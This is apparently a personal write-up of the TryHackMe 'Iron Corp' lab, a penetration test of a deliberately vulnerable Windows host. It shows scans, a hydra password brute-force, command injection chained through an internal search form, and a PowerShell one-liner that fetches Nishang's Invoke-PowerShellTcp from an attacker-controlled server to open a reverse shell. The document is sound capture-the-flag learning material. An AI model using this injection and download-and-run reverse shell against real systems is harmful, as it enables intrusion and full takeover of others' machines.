<h1 align="center">Iron Corp</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/3ca6aff2-34c6-43ea-89e8-01a22a793524"><br>
2025, September 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>506</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Can you get access to Iron Corp's system</em>?<br>
Access it <a href=https://tryhackme.com/room/ironcorp">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b7cf893f-e0ad-4b8e-9f53-46b54516f860"></p>

<br>

<h3 align="center">Web Application Assessment</strong></h3>

<div align="center"><h6>

| **Cyber Kill<br>Chain Phase** | **Tools**                                                                                          | **Actions<br>**                                                                                                     | **MITRE ATT&CK<br>Technique**                          |
|:--------------------------|:--------------------------------------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------|
|Reconnaissance<br><br><br><br><br><br><br>|`dig`, `nmap`, `rustscan`, `dirb`<br><br><br>`dirb`<br><br>Burp Suite + FoxyProxy|Domain enumeration, port scanning, content discovery<br><br>Discovered content on ports 8080 and 11025<br><br>Intercepted and inspected HTTP traffic to understand application behavior|File and Directory Discovery, T1083<br><br><br>File and Directory Discovery, T1083<br><br>Network Sniffing, T1040|
| Weaponization    | `Burp Suite` Repeater                                                   |Crafted malicious HTTP GET payload  | Exploitation for Client Execution, T1203  |
| Delivery         | `Burp Suite` +`FoxyProxy`                                               |Delivered payload via vulnerable web parameter (`name.php?name=...`)                                                     | Command and Scripting Interpreter: PowerShell, T1059.001        |
| Exploitation     |`Burp Suite` Repeater<br>`hydra` + `rockyou.txt`<br> PowerShell (`whoami`)<br>                        |Triggered PowerShell reverse shell<br>Brute-forced password for `admin` account<br>Identified current user context (`nt authority\system`)<br> | Exploitation for Client Execution, T1203<br>Password Guessing , T1110.001<br>System Information Discovery, T1082|
| Installation     | PowerShell, HTTP reverse shell                                          |Established shell access on target system           | Command and Scripting Interpreter: PowerShell, T1059.001        |
| Command &<br>Control (C2)|PowerShell TCP reverse shell<br>PowerShell (`dir`, `ls`)         |Executed reverse shell using `Invoke-PowerShellTcp.ps1`<br> Maintained remote access<br>Attempted access to `C:\Users\admin` and `C:\Users\Equinox`                                                                                                   | Application Layer Protocol: Web Protocols, T1071.001<br>File and Directory Discovery, T1083 |
|Actions on<br>Objectives|PowerShell (`dir`, `ls`, `-force`), manual navigation              | Enumerated directories, accessed hidden files, retrieved `user.txt`<br>Probed user directories including `Equinox`, `admin`, and `Administrator`    | Data from Local System, T1005|

</h6></div><br>



<br>
<h1 align="center">Task 1 . Iron Corp</h1>
<p align="center">Iron Corp suffered a security breach not long time ago.<br><br>
You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.<br><br>
The asset in scope is: ironcorp.me<br><br>
Note: <em>Edit your config file and add <code>ironcorp.me</code></em><br><br>
Note 2: <em>It might take around 5-7 minutes for the VM to fully boot, so please be patient</em>.<br><br>
Happy hacking!</p>

<br>
<br>

<p align="center"><em>Answer the questions below</em></p>

<p align="center">1.1. user.txt<br>
<code>thm{********************************}</code></p>

<br>

<p align="center">1.2. root.txt<br>
<code>thm{********************************}</code></p>
<br>
<br>

<h1 align="center">Reconnaissance</h1>
<br>
<h3 align="center">Domain Names</h3>
<p  align="center"><code>ironcorp.me</code></p>

```bash
TargetIP     ironcorp.me
```

<br>
<p align="center"><code>ironcorp.me</code> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp; admin.<code>ironcorp.me</code> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp; internal.<code>ironcorp.me</code></p>

```bash
:~/IronCorp# dig axfr ironcorp.me @xx.xxx.xx.xxx

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr ironcorp.me @TargetIP
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 480 msec
;; SERVER:TargetIP#53(TargetIP) (TCP)
;; WHEN: Fri Aug 01 03:53:39 BST 2025
;; XFR size: 5 records (messages 1, bytes 238)
```

<br>

```bash
xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
```

<br>
<h3 align="center">Port Scanning</h3>

<div align="center"><h6>

| **Port**     | **Service**     |
|--------------:|:--------------------------|
| `53`         | DNS                      |
| `135`        | MSRPC                    |
| `3389`       | RDP                      |
| `5985`       | HTTPAPI                  |
| `8080`       | IIS                      |
| `11025`      | HTTP                     |
| `49667`      | MSRPC                    |
| `49670`      | MSRPC                    |

</h6></div><br>


```bash
:~/IronCorp# nmap -p- -vv ironcorp.me
...
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 128
135/tcp   open  msrpc         syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
11025/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
```

<br>

```bash
:~/IronCorp# nmap -sS -Pn -p- ironcorp.me
...
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
```

<br>

```bash
:~/IronCorp# rustscan -a xx.xxx.xx.xxx --ulimit 5500 -b 65535 -- -A -Pn
...
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-xx-xxTxx:xx:xx+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-xx-xxTxx:xx:xx
| Not valid after:  2026-xx-xxTxx:xx:xx
| MD5:   9278 1461 c030 09f6 3d60 0acd 12e5 d20a
| SHA-1: 56dc 8460 f7cf 4a05 fe76 7c81 3ba1 2e21 3eda 2b85
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQWRcbnyVb4ZVHx7fpg2OI/DANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjUwNzMxMDA0ODQzWhcNMjYw
...
| eqDo7JphpRmrTFVMEevsUfG4CIQFesyvPxtC0OSiSnC7c38isAuokbAAB/wvfXMv
| DhIOctQDwqctVRPklaMvpydWlkMnOQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

<br>
<h3 align="center">Content Discovery</h3>
<br>
<p align="center">xx.xxx.xx.xxx:<strong>8080</strong></p>

<div align="center"><h6>

| **Path**                                                                 | **Why It's Valuable**                                                                 |
|--------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `/index.html`                                                            | Main page — may contain links, comments, or hints.                                    |
| `/assets/js/`                                                            | JavaScript files often reveal hidden endpoints or logic flaws.                        |
| `/assets/plugins/`                                                      | May include third-party libraries with known vulnerabilities.                         |
| `/assets/images/gallery/` and `/assets/Images/gallery/`                 | Potential for steganography or metadata clues in images.                              |
| `/assets/images/timeline/` and `/assets/Images/timeline/`               | Could contain historical or event-related files with embedded flags.                  |
| `/assets/css/`                                                           | Sometimes includes commented-out code or references to hidden pages.                  |
| `/assets/fonts/`                                                         | Low Priority, Typically decorative, but worth checking for anomalies.                               |
| `/assets/flags/1x1/`                                                     | Low Priority, Likely visual assets, but inspect for unusual naming or hidden data.                  |
| `/assets/images/favicon.ico`                                            | Low Priority, Duplicate in both `/images/` and `/Images/`; check for steganography just in case.    |

</h6></div><br>

```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:8080
...                                                        

---- Scanning URL: http://xx.xxx.xx.xxx:8080/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/                                                                                                                                                                                           
+ http://xx.xxx.xx.xxx:8080/index.html (CODE:200|SIZE:20040)                                                                                                                                                                               
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/css/                                                                                                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/fonts/                                                                                                                                                                                     
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/                                                                                                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/js/                                                                                                                                                                                        
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/plugins/                                                                                                                                                                                   
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/css/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/ ----
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/                                                                                                                                                                                 
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/fonts/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/ ----
+ http://xx.xxx.xx.xxx:8080/assets/Images/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                 
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/                                                                                                                                                                            
==> DIRECTORY: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/                                                                                                                                                                           
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/js/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/plugins/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/flags/1x1/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/images/timeline/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/gallery/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://xx.xxx.xx.xxx:8080/assets/Images/timeline/ ----
                                                                                                                                                                                                                                           
-----------------
```

<br>
<p align="center">xx.xxx.xx.xxx:<strong>11025</strong></p>
 
<div align="center"><h6>

| **Path**                                                                 | **Why It's Valuable**                                                                 |
|--------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `/index.html`                                                            | Main page — may contain links, comments, or hints.                                    |
| `/js/`                                                                   | JavaScript files — could reveal endpoints or logic flaws.                             |
| `/vendor/`                                                               | May contain third-party libraries or hidden tools.                                    |
| `/img/`                                                                  | Listable — inspect for steganography or metadata clues.                               |
| `/css/`                                                                  | Listable — check for commented-out code or hidden references.                         |
| `/license`, `/LICENSE`                                                  | Accessible — might contain software info or clues.                                    |
| `/examples`                                                              | Returns 503 — could be broken or under maintenance, worth probing.                    |
| `/cgi-bin/`                                                              | Forbidden — often linked to server-side scripts, may hide sensitive functionality.    |
| `/phpmyadmin`                                                            | Forbidden — could indicate a database admin panel, potential entry point.             |
| `/aux`, `/com1`, `/com2`, `/com3`, `/con`, `/lpt1`, `/lpt2`, `/nul`, `/prn` | Low Priority, Reserved device names — likely placeholders or honeypots.              |
| `/licenses`                                                              | Low Priority, Forbidden — may duplicate `/license`, less likely to hold unique data. |
| `/server-info`, `/server-status`                                        | Low Priority, Forbidden — standard Apache endpoints, usually disabled.               |
| `/webalizer`                                                             | Low Priority, Forbidden — web stats tool, unlikely to hold sensitive data.           |

</h6></div><br>

```bash
:~/IronCorp# dirb http://xx.xxx.xx.xxx:11025
...
---- Scanning URL: http://xx.xxx.xx.xxx:11025/ ----
+ http://xx.xxx.xx.xxx:11025/aux (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/cgi-bin/ (CODE:403|SIZE:1061)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/com1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/com3 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/con (CODE:403|SIZE:1047)                                                                                                              
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/css/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/examples (CODE:503|SIZE:1061)                                                                                                         
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/img/                                                                                                                     
+ http://xx.xxx.xx.xxx:11025/index.html (CODE:200|SIZE:2739)                                                                                                       
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/js/                                                                                                                      
+ http://xx.xxx.xx.xxx:11025/license (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/LICENSE (CODE:200|SIZE:1093)                                                                                                          
+ http://xx.xxx.xx.xxx:11025/licenses (CODE:403|SIZE:1206)                                                                                                         
+ http://xx.xxx.xx.xxx:11025/lpt1 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/lpt2 (CODE:403|SIZE:1047)                                                                                                             
+ http://xx.xxx.xx.xxx:11025/nul (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/phpmyadmin (CODE:403|SIZE:1047)                                                                                                       
+ http://xx.xxx.xx.xxx:11025/prn (CODE:403|SIZE:1047)                                                                                                              
+ http://xx.xxx.xx.xxx:11025/server-info (CODE:403|SIZE:1206)                                                                                                      
+ http://xx.xxx.xx.xxx:11025/server-status (CODE:403|SIZE:1206)                                                                                                    
==> DIRECTORY: http://xx.xxx.xx.xxx:11025/vendor/                                                                                                                  
+ http://xx.xxx.xx.xxx:11025/webalizer (CODE:403|SIZE:1047)                                                                                                        
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                   
---- Entering directory: http://xx.xxx.xx.xxx:11025/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
```

<br>
<h3 align="center">Web Inspection</h3>

<div align="center"><h6>

| **Target**                         | **Path / Feature**                                                        | **Why It's Valuable**                                                                 |
|-----------------------------------|---------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `ironcorp.me:8080`                | Dashtreme Admin Dashboard                                                | Indicates use of a known template — may expose default credentials or predictable paths. |
| `internal.ironcorp.me:8080`       | `/assets/js/*.js`, `/assets/plugins/*.js`                                | Multiple accessible JS files — potential for endpoint discovery or logic flaws.        |
|                                   | `/assets/plugins/vectormap/jquery-jvectormap-2.0.2.css` (400)            | Broken plugin — may indicate misconfigurations or missing resources.                   |
|                                   | `/110x110`                                                                | Unusual path — worth probing for hidden content or misconfigured routing.              |
|                                   | `/assets/js/jquery.loading-indicator.js` (404)                           | Missing file — may break functionality or hint at removed features.                    |
|                                   | Dashtreme Admin Dashboard                                                | Same template reused internally — raises concerns about asset duplication and exposure.|
| `admin.ironcorp.me:11025`         | Basic Auth with `admin:admin`                                            | Default credentials — critical vulnerability if accepted.                              |
|                                   | Basic Auth with `admin:password123`                                      | Weak credentials — successful login confirmed.                                         |
|                                   | `/` with `/?r=ls#`                                                        | Command injection-like behavior — potential RCE vector via query parameter.            |
|                                   | Response HTML: `method="GET"`, `action="#"`, `name="r"`                  | Form structure suggests command execution via GET — high-risk functionality.           |

</h6></div><br>


<p align="center"><code>ironcorp.me</code>:8080</p>

<img width="1138" height="755" alt="image" src="https://github.com/user-attachments/assets/aa9eceff-830b-48e8-96a2-7fc006da2c39" />

<br>
<br>
<p align="center"><code>ironcorp.me</code>:8080/tables.html</p>

<img width="1134" height="653" alt="image" src="https://github.com/user-attachments/assets/754cf73c-27b0-42f7-acad-e90f282e9240" />

<br>
<br>
<p align="center"><code>ironcorp.me</code>:8080/login.html</p>

<img width="1136" height="568" alt="image" src="https://github.com/user-attachments/assets/df090c3c-085e-4713-af54-d4a46b7d7531" />

<br>
<br>

<p align="center"><code>admin.ironcorp.me</code>:8080/login.html</p>

<img width="1132" height="279" alt="image" src="https://github.com/user-attachments/assets/a8c1ac92-ab52-4498-b092-f07128f47b60" />

<br>
<br>
<p align="center"><code>admin.ironcorp.me</code>:11025</p>

<img width="1129" height="330" alt="image" src="https://github.com/user-attachments/assets/d1cb7eb3-98d1-434f-adde-ed8c6d846b73" />


<br>
<br>
<h3 align="center">T1110.001 – Password Guessing</h3>
<p align= "center">admin: password123</p>

```bash
:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
```

<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />

<br>
<br>

<p align="center"><code>admin.ironcorp.me</code>:11025</p>

<img width="1131" height="542" alt="image" src="https://github.com/user-attachments/assets/85fc8301-cea7-4fe2-b2ed-2102f69e018e" />

<br>
<br>

<h3>whoami</h3>

```bash
GET /?r=whoami HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic ************************
Connection: keep-alive
Referer: http://admin.ironcorp.me:11025/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```


```bash
HTTP/1.1 200 OK
Date: Wed, 24 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
X-Powered-By: PHP/7.4.4
Content-Length: 2796
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<html>
<head>
...
</script>

<!DOCTYPE HTML>
<html>
    <head>
        <title>Search Panel</title>
    </head>

    <body>
        <h2>Ultimate search bar</h2>

                <div>
           
            <form method="GET" action="#">
            <span>Search: 
                <input name="r" type="text" placeholder="******" />
                <input type="submit" />
            </span>
            
            </form>
        </div>  


    </body>

</html>
```

<h1 align="center">Reconnaissance</h1>

<h3 align="center">Search: <em>internal.ironcorp.me:11025</em></h3>

<img width="1128" height="222" alt="image" src="https://github.com/user-attachments/assets/a81dba2d-b3f4-457d-b3ac-9b637bbd1356" />

<br>
<br>
<h3 align="center">Clicked <code>Here</code></h3>

<img width="1130" height="331" alt="image" src="https://github.com/user-attachments/assets/51f2ede4-13bb-4853-9912-a3091d207e06" />

<br>
<br>
<h3 align="center">Clicked <code>Webmaster</code></h3>

<img width="683" height="237" alt="image" src="https://github.com/user-attachments/assets/c5cc46a8-9e37-40ea-ba82-ef4c2f85f89e" />

<br>
<br>
<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?ls</em><h3>
<p>

- Notice:  Undefined index: name in E:\xampp\htdocs\internal\name.php on line 8<br>Equinox</p>

<img width="1124" height="304" alt="image" src="https://github.com/user-attachments/assets/8f543fb3-bfd6-44f7-91c8-982104028c18" />

<br>
<br>
<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?name=hello</em></h3>
<p>

- Equinoxhello</p>

<img width="1130" height="257" alt="image" src="https://github.com/user-attachments/assets/db940db3-daa4-467a-941d-cf624667e563" />

<br>
<br>
<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?name=hello|whoami</em></h3>
<p>

- nt authority\system</p>

<img width="1131" height="254" alt="image" src="https://github.com/user-attachments/assets/a3618d73-e4f7-4028-95a7-cd92d6c93dcd" />

<br>
<br>

<h3 align="center">Invoke-PowerShellTcp</h3>
<p>

- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>

<br>


```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://xx.xxx.xxx.xxx:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.xxx.xxx -Port 9001
```

```bash
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31
```


```bash
http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dhello%7C%2525%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31#
```

<img width="1118" height="462" alt="image" src="https://github.com/user-attachments/assets/0d593bd2-aee5-43b1-a898-f9375e7ba2d6" />

<br>
<br>

```bash
PS E:\xampp> cd C:\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   4:41 AM                Admin                         
d-----        4/11/2020  11:07 AM                Administrator                 
d-----        4/11/2020  11:55 AM                Equinox                       
d-r---        4/11/2020  10:34 AM                Public                        
d-----        4/11/2020  11:56 AM                Sunlight                      
d-----        4/11/2020  11:53 AM                SuperAdmin                    
d-----        4/11/2020   3:00 AM                TEMP                          


PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        4/12/2020   1:27 AM                Contacts                      
d-r---        4/12/2020   1:27 AM                Desktop                       
d-r---        4/12/2020   1:27 AM                Documents                     
d-r---        4/12/2020   1:27 AM                Downloads                     
d-r---        4/12/2020   1:27 AM                Favorites                     
d-r---        4/12/2020   1:27 AM                Links                         
d-r---        4/12/2020   1:27 AM                Music                         
d-r---        4/12/2020   1:27 AM                Pictures                      
d-r---        4/12/2020   1:27 AM                Saved Games                   
d-r---        4/12/2020   1:27 AM                Searches                      
d-r---        4/12/2020   1:27 AM                Videos                        


PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 user.txt                      


PS C:\Users\Administrator\Desktop> type user.txt
thm{********************************}
```

<br>
<br>


```bash
PS C:\users\Equinox\Desktop> dir
```

```bash
PS C:\users\Equinox\Desktop> dir -force


    Directory: C:\users\Equinox\Desktop
```

```bash
PS C:\users\admin> ls -force
```

```bash
PS C:\Users\admin> dir : Access to the path 'C:\Users\admin' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\admin:String) [Get-C 
   hildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
   Commands.GetChildItemCommand
```

<img width="1115" height="256" alt="image" src="https://github.com/user-attachments/assets/9695c856-a3f4-45b9-b615-082e72ec2247" />

<br>
<br>

<img width="1123" height="446" alt="image" src="https://github.com/user-attachments/assets/8819a5aa-3c12-4119-aaff-0fee597c0340" />

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5052af70-aec1-4e63-8455-f30d4b154462"><br><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/8f1c9b97-d5e9-425e-9414-b2ce21e9264a"></p>


<br>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
|24      |Hard 🚩 - <strong>Iron Corp</strong>   | 506    |    111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ   |     5ᵗʰ     | 126,768  |   972     |   76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505 |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     5ᵗʰ     | 126,768  |   971     |   76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |             |             |          |           |   76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |             |             |          |           |   76     |        
|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ   |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ   |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ   |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ   |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ   |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ   |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ   |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ   |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ   |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ   |     9ᵗʰ    | 125,606  |    959    |    73     |
